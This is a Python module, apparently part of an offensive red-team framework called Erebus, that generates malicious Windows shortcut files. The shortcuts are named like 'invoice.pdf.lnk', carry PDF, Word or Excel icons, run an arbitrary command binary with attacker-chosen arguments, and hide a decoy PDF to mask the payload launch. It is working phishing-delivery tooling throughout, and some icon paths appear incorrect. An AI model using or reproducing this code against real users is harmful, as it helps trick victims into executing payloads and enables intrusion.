"""
LNK Trigger Creation Module for Erebus Helper
Supports creating Windows shortcut (.lnk) files with custom properties

Features:
- Custom icon selection from system DLLs
- Hidden file attributes
- Custom descriptions and arguments
- Decoy file handling

Reference: Windows Icons & Their Paths
https://diymediahome.org/windows-icons-reference-list-with-details-locations-images/
"""
import pathlib
import os
import sys
import stat
import logging

try:
    import pylnk3
except ImportError:
    pylnk3 = None

logger = logging.getLogger("ErebusHelper.LNK")

REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
AGENT_CODE = REPO_ROOT / "agent_code"
PAYLOAD_DIR = AGENT_CODE / "payload"
DECOY_FILE = AGENT_CODE / "decoys" / "decoy.pdf"

# Windows Icon Aliases for common applications
ICON_ALIASES = {
    "pdf": ("C:\\Windows\\System32\\AcroExch.Document.DC.dll", 0),
    "word": ("C:\\Windows\\System32\\WINWORD.EXE", 0),
    "excel": ("C:\\Windows\\System32\\EXCEL.EXE", 0),
    "powerpoint": ("C:\\Windows\\System32\\POWERPNT.EXE", 0),
    "folder": ("C:\\Windows\\System32\\shell32.dll", 3),
    "document": ("C:\\Windows\\System32\\shell32.dll", 1),
    "generic": ("C:\\Windows\\System32\\shell32.dll", 0),
}

def set_file_hidden(file_path: str):
    """Set a file as hidden (Windows) or with restricted permissions (Linux/Unix)

    Args:
        file_path (str): Path to the file to hide
    """
    try:
        file_path_obj = pathlib.Path(file_path)
        if not file_path_obj.exists():
            logger.warning(f"File does not exist: {file_path}")
            return

        if sys.platform == "win32":
            try:
                import ctypes
                FILE_ATTRIBUTE_HIDDEN = 0x02
                ctypes.windll.kernel32.SetFileAttributesW(str(file_path), FILE_ATTRIBUTE_HIDDEN)
                logger.debug(f"File set as hidden: {file_path}")
            except Exception as e:
                logger.error(f"Error setting file as hidden on Windows: {e}")
        else:
            os.chmod(file_path, stat.S_IRUSR | stat.S_IWUSR)
            logger.debug(f"File permissions restricted: {file_path}")
    except Exception as e:
        logger.error(f"Error setting file attributes: {e}")

def create_lnk_trigger(target_bin: str, args: str, icon_src: str, icon_index: int, description: str, payload_dir: pathlib.Path = None, output_filename: str = "invoice.pdf.lnk"):
    """Create an LNK trigger file in the payloads directory

    Args:
        target_bin (str): binary to execute a system command with
        args (str): binary arguments
        icon_src (str): DLL source for Windows Icons
        icon_index (int): Index No. of Icon
        description (str): LNK Description
        payload_dir (pathlib.Path): Directory where payload files are stored
        output_filename (str): Output LNK filename (default: invoice.pdf.lnk)

    Returns:
        pathlib.Path: Path to the created LNK file
        
    Raises:
        ImportError: If pylnk3 module is not available
    """
    if pylnk3 is None:
        raise ImportError("pylnk3 module not found. Install with: pip install pylnk3")
    
    if payload_dir is None:
        payload_dir = PAYLOAD_DIR
    
    # Ensure payload directory exists
    payload_dir = pathlib.Path(payload_dir)
    payload_dir.mkdir(parents=True, exist_ok=True)
    
    lnk_output_path = payload_dir / output_filename

    logger.info(f"Creating LNK trigger: {lnk_output_path}")
    
    try:
        # Create LNK file with proper properties
        lnk = pylnk3.Lnk()
        lnk = pylnk3.for_file(target_bin, str(lnk_output_path), args, description, icon_src, icon_index)
        lnk.save(str(lnk_output_path))
        
        logger.info(f"LNK trigger created successfully: {lnk_output_path}")
        return lnk_output_path
    except Exception as e:
        logger.error(f"Failed to create LNK trigger: {e}")
        raise

def create_payload_trigger(target_bin: str, args: str, icon_src: str, icon_index: int, description: str, payload_dir: pathlib.Path = None, decoy_file: pathlib.Path = None):
    """Create LNK trigger with conhost + cmd + payload piped to decoy.pdf
    
    Args:
        target_bin (str): binary to execute
        args (str): binary arguments
        icon_src (str): DLL source for Windows Icons
        icon_index (int): Icon index number
        description (str): LNK Description
        payload_dir (pathlib.Path): Directory where payload files are stored
        decoy_file (pathlib.Path): Path to decoy file to hide

    Returns:
        pathlib.Path: Path to the created LNK file
    """
    if decoy_file is None:
        decoy_file = DECOY_FILE

    lnk_file = create_lnk_trigger(
        target_bin=target_bin,
        args=args,
        icon_src=icon_src,
        icon_index=icon_index,
        description=description,
        payload_dir=payload_dir
    )

    # Set decoy file as hidden
    if decoy_file and pathlib.Path(decoy_file).exists():
        set_file_hidden(str(decoy_file))
        logger.info(f"Decoy file hidden: {decoy_file}")

    return lnk_file


def get_icon_by_alias(alias: str) -> tuple:
    """Get icon path and index by alias name
    
    Args:
        alias (str): Icon alias name (e.g., 'pdf', 'word', 'excel')
    
    Returns:
        tuple: (icon_path, icon_index) or (default_path, 0) if not found
    """
    return ICON_ALIASES.get(alias.lower(), ICON_ALIASES["generic"])


def create_lnk_with_alias(target_bin: str, args: str, icon_alias: str, description: str, 
                         payload_dir: pathlib.Path = None, output_filename: str = "document.lnk") -> pathlib.Path:
    """Create LNK trigger using icon alias instead of raw path
    
    Args:
        target_bin (str): binary to execute
        args (str): binary arguments
        icon_alias (str): Icon alias (pdf, word, excel, folder, etc.)
        description (str): LNK Description
        payload_dir (pathlib.Path): Directory where payload files are stored
        output_filename (str): Output LNK filename

    Returns:
        pathlib.Path: Path to the created LNK file
    """
    icon_src, icon_index = get_icon_by_alias(icon_alias)
    
    logger.info(f"Creating LNK with icon alias '{icon_alias}': {icon_src}[{icon_index}]")
    
    return create_lnk_trigger(
        target_bin=target_bin,
        args=args,
        icon_src=icon_src,
        icon_index=icon_index,
        description=description,
        payload_dir=payload_dir,
        output_filename=output_filename
    )
